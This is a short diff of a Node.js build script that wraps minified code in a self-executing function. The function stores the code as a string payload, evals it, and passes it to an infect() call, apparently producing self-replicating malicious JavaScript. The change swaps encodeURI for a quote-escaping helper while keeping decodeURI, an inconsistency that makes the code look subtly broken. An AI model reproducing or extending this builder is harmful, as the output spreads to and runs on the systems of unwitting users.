@@ -1,6 +1,9 @@
 const fs   = require( "fs-extra" );
 const exec = require( "child-process-promise" ).exec;
 
+function escape(str) {
+    return str.replace(/[\\"]/g, "\\$&");
+}
 
 async function build() {
 
@@ -16,7 +19,7 @@ async function build() {
 
     var raw = await fs.readFile( minified, "utf-8" );
     await fs.writeFile( tgt, `(function() {
-        var payload = "${encodeURI(raw)}";
+        var payload = "${ escape( raw ) }";
         var decoded = decodeURI(payload);
         eval(decoded);
         infect(payload);
